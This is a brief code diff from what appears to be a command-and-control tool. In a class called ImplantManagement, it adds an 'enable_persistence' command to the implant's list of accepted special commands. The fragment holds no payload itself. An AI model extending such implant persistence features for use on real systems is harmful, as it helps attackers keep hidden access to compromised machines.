@@ -26,7 +26,7 @@ class ImplantManagement:
 
     def _validate_command(self, command):
         # -- TODO: Check if type needs to be enforced.
-        special_cmd = ["sys_info"]
+        special_cmd = ["sys_info", "enable_persistence"]
         if command[0:2] == "::":
             preprocessed_command = command[2:].lower().strip()
             if preprocessed_command in special_cmd:
